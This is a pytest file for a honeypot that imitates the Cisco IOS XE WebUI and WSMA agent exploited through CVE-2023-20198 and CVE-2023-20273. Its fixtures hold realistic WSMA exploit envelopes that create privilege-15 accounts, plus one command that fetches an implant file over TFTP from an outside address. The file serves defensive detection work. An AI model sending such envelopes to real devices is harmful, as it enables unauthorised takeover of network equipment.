"""Tests for the Cisco IOS XE WebUI + WSMA trap.

`/webui/` is the IOS XE web management UI, and the entry point of the
implant chain CISA added to its Known Exploited Vulnerabilities catalog in
October 2023: CVE-2023-20198 takes an unauthenticated session, then
CVE-2023-20273 escalates by POSTing a Web Services Management Agent (WSMA)
XML envelope whose `<exec>` element runs privileged IOS commands.

Three properties carry this family and each is tested below:

* **Matching is exact, never a `/webui/` prefix.** `/webui/.env`,
  `/open-webui/.env` and the `stable-diffusion-webui` spellings are a
  different population — LLM-frontend credential dredging — already served
  by the env-canary and tarpit modules. A prefix match here would steal
  that traffic and silently retag it as appliance exploitation, so the
  must-not-match cases are load-bearing, not decoration.

* **The WSMA leg is reachable without a successful login.** That is the
  bug: an authentication bypass means a real vulnerable box answers the
  agent unauthenticated. Gating the agent behind our own login form would
  make the trap less realistic than the vulnerability it imitates.

* **The `<exec>` extractor has to survive a real envelope.** Exploit
  tooling varies the element name, the namespace prefix and whether CDATA
  is used, so the extractor is tested against genuine envelope shapes
  rather than a placeholder string.
"""

import json

import pytest
import pytest_asyncio

from flux import server as tbenv


@pytest_asyncio.fixture
async def flux_client(aiohttp_client, monkeypatch, tmp_path):
    """Real aiohttp app with LOG_PATH routed into tmp_path."""
    monkeypatch.setattr(tbenv, "LOG_PATH", tmp_path / "env-canary.jsonl")
    client = await aiohttp_client(tbenv.create_app())
    client.log_path = tmp_path / "env-canary.jsonl"
    return client


def _log_rows(client):
    if not client.log_path.exists():
        return []
    return [
        json.loads(line)
        for line in client.log_path.read_text().splitlines()
        if line.strip()
    ]


# --- registration / path matching --------------------------------------

def test_cisco_iosxe_enabled_by_default():
    assert tbenv.CISCO_IOSXE_ENABLED


def test_path_sets_are_non_empty():
    """Guard the premise of every parametrised case below.

    The match sets are module constants; if one were emptied the matcher
    would return "" for everything and the must-not-match assertions would
    all pass vacuously while the trap served nothing.
    """
    assert tbenv._CISCO_IOSXE_PAGE_PATHS
    assert tbenv._CISCO_IOSXE_WSMA_PATHS
    assert tbenv._CISCO_IOSXE_STATE_PATHS
    assert tbenv._CISCO_IOSXE_LOGIN_PATHS
    assert tbenv._CISCO_IOSXE_LOGOUT_PATHS


@pytest.mark.parametrize("path,family", [
    ("/webui", "page"),
    ("/webui/", "page"),
    ("/webui/index.html", "page"),
    ("/WebUI/", "page"),
    ("/webui/logoutconfirm.html", "logout"),
    ("/webui/gui_states/index.json", "state"),
    ("/webui/application/get_saml_request", "state"),
    ("/webui/login", "login"),
    ("/webui_wsma_Http", "wsma"),
    ("/webui_wsma_https", "wsma"),
    ("/webui_wsma_HTTP", "wsma"),
    ("/webui_wsma_HttpS", "wsma"),
])
def test_matches_observed_spellings(path, family):
    assert tbenv.is_cisco_iosxe_path(path)
    assert tbenv._cisco_iosxe_family(path) == family


@pytest.mark.parametrize("path", [
    # The LLM-frontend credential-dredge family. These MUST fall through to
    # the canary/tarpit modules that already answer them.
    "/webui/.env",
    "/webui/.env.production",
    "/open-webui/.env",
    "/open-webui/backend/.env",
    "/.open-webui/config.json",
    "/stable-diffusion-webui/webui-user.sh",
    "/stable-diffusion-webui/.env",
    "/text-generation-webui/settings.yaml",
    "/webui-user.sh",
    "/webui/apps/sdcss",
    # Unrelated paths that merely share a prefix or a word.
    "/webui_wsma",
    "/webuix",
    "/webui/css/webui.css",
    "/api/webui",
    "/",
    "/wsman",
])
def test_does_not_match_adjacent_families(path):
    assert not tbenv.is_cisco_iosxe_path(path)
    assert tbenv._cisco_iosxe_family(path) == ""


def test_disabled_by_env_flag(monkeypatch):
    monkeypatch.setattr(tbenv, "CISCO_IOSXE_ENABLED", False)
    assert not tbenv.is_cisco_iosxe_path("/webui/")
    assert not tbenv.is_cisco_iosxe_path("/webui_wsma_Http")


# --- WSMA <exec> extraction against realistic envelopes ----------------

def test_exec_extractor_round_trips_a_cdata_envelope():
    """A genuine WSMA exec envelope: namespace-prefixed, CDATA-wrapped,
    carrying the account-creation command the escalation step sends."""
    body = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
        b'<soap:Body>'
        b'<request xmlns="urn:cisco:wsma-exec" correlator="exec-42">'
        b'<execCLI maxWait="PT60S" xsd="false">'
        b'<cmd><![CDATA[username svcops privilege 15 secret 0 Str0ngPass]]></cmd>'
        b'</execCLI></request></soap:Body></soap:Envelope>'
    )
    cmds = tbenv.cisco_iosxe_wsma_commands(body)
    assert cmds == ["username svcops privilege 15 secret 0 Str0ngPass"]
    assert tbenv.cisco_iosxe_wsma_correlator(body) == "exec-42"


def test_exec_extractor_handles_plain_exec_without_cdata():
    body = (
        b'<request xmlns="urn:cisco:wsma-exec" correlator="c1">'
        b'<exec>show running-config</exec>'
        b'</request>'
    )
    assert tbenv.cisco_iosxe_wsma_commands(body) == ["show running-config"]


def test_exec_extractor_collects_multiple_commands_in_order():
    body = (
        b'<request xmlns="urn:cisco:wsma-exec">'
        b'<exec><![CDATA[username bd privilege 15 secret 0 x]]></exec>'
        b'<exec><![CDATA[write memory]]></exec>'
        b'</request>'
    )
    assert tbenv.cisco_iosxe_wsma_commands(body) == [
        "username bd privilege 15 secret 0 x",
        "write memory",
    ]


def test_exec_extractor_is_empty_on_a_non_wsma_body():
    assert tbenv.cisco_iosxe_wsma_commands(b"") == []
    assert tbenv.cisco_iosxe_wsma_commands(b"not xml at all") == []
    assert tbenv.cisco_iosxe_wsma_correlator(b"not xml at all") == ""


# --- served responses ---------------------------------------------------

@pytest.mark.asyncio
async def test_webui_root_serves_the_login_shell(flux_client):
    resp = await flux_client.get("/webui/")
    assert resp.status == 200
    text = await resp.text()
    assert "/webui/login" in text
    assert resp.headers["Content-Type"].startswith("text/html")
    rows = [r for r in _log_rows(flux_client) if r.get("result") == "cisco-iosxe-webui-probe"]
    assert rows and rows[-1]["ciscoIosxeFamily"] == "page"


@pytest.mark.asyncio
async def test_state_document_reports_the_agent_as_present(flux_client):
    """The state document is what makes the WSMA follow-up plausible: a box
    that reports `wsma: true` is one worth sending an `exec` to."""
    resp = await flux_client.get("/webui/gui_states/index.json")
    assert resp.status == 200
    assert (await resp.json())["features"]["wsma"] is True


@pytest.mark.asyncio
async def test_saml_probe_reports_sso_unconfigured(flux_client):
    resp = await flux_client.get("/webui/application/get_saml_request")
    assert resp.status == 200
    assert (await resp.json())["error"] == "sso-not-configured"


@pytest.mark.asyncio
async def test_login_post_captures_username_without_storing_password(flux_client):
    resp = await flux_client.post(
        "/webui/login", data={"user": "admin", "password": "hunter2"},
    )
    assert resp.status == 401
    row = [r for r in _log_rows(flux_client) if r.get("result") == "cisco-iosxe-webui-login"][-1]
    assert row["ciscoIosxeUsername"] == "admin"
    assert row["ciscoIosxeHasPassword"] is True
    assert "hunter2" not in json.dumps(row)


@pytest.mark.asyncio
async def test_wsma_post_captures_exec_and_flags_account_creation(flux_client):
    body = (
        '<request xmlns="urn:cisco:wsma-exec" correlator="exec-7">'
        '<exec><![CDATA[username svcops privilege 15 secret 0 P@ss]]></exec>'
        '</request>'
    )
    resp = await flux_client.post("/webui_wsma_Http", data=body.encode())
    assert resp.status == 200
    text = await resp.text()
    # The correlator is echoed so the client matches the response to its
    # request and sends the next exec.
    assert 'correlator="exec-7"' in text
    assert 'success="1"' in text

    row = [r for r in _log_rows(flux_client) if r.get("result") == "cisco-iosxe-wsma-exec"][-1]
    assert row["ciscoIosxeWsmaCommands"] == ["username svcops privilege 15 secret 0 P@ss"]
    assert row["ciscoIosxeWsmaHasAccountCreation"] is True
    assert row["ciscoIosxeWsmaCommandCount"] == 1
    assert len(row["ciscoIosxeWsmaBodySha256"]) == 64


@pytest.mark.asyncio
async def test_wsma_flags_implant_indicators(flux_client):
    body = (
        '<request xmlns="urn:cisco:wsma-exec">'
        '<exec><![CDATA[copy tftp://198.51.100.7/cisco_service.conf flash:]]></exec>'
        '</request>'
    )
    resp = await flux_client.post("/webui_wsma_https", data=body.encode())
    assert resp.status == 200
    row = [r for r in _log_rows(flux_client) if r.get("result") == "cisco-iosxe-wsma-exec"][-1]
    assert row["ciscoIosxeWsmaHasImplantIndicator"] is True


@pytest.mark.asyncio
async def test_wsma_post_without_exec_is_tagged_as_a_probe(flux_client):
    resp = await flux_client.post("/webui_wsma_Http", data=b"<request/>")
    assert resp.status == 200
    results = [r.get("result") for r in _log_rows(flux_client)]
    assert "cisco-iosxe-wsma-probe" in results


@pytest.mark.asyncio
async def test_wsma_get_is_method_not_allowed(flux_client):
    """The agent is POST-only; a real box answers a GET with 405. Kept
    distinct so path-list replays stay separable from real agent drivers."""
    resp = await flux_client.get("/webui_wsma_Http")
    assert resp.status == 405
    assert resp.headers.get("Allow") == "POST"
    results = [r.get("result") for r in _log_rows(flux_client)]
    assert "cisco-iosxe-wsma-method-not-allowed" in results


@pytest.mark.asyncio
async def test_env_dredge_under_webui_is_not_claimed_by_this_trap(flux_client):
    """`/webui/.env` belongs to the canary/tarpit family. Whatever answers
    it, it must not be tagged as IOS XE appliance exploitation."""
    await flux_client.get("/webui/.env")
    results = [r.get("result", "") for r in _log_rows(flux_client)]
    assert not any(str(r).startswith("cisco-iosxe") for r in results)


@pytest.mark.asyncio
async def test_no_credential_shaped_literal_in_any_served_body(flux_client):
    """The trap emits no secret-shaped value at all — no password, token,
    key or session cookie — so there is nothing to ship identically across
    the fleet."""
    for path in ("/webui/", "/webui/index.html", "/webui/logoutconfirm.html",
                 "/webui/gui_states/index.json"):
        resp = await flux_client.get(path)
        body = (await resp.text()).lower()
        assert "secret" not in body
        assert "password" not in body or "autocomplete=\"current-password\"" in body
        assert resp.headers.get("Set-Cookie") is None
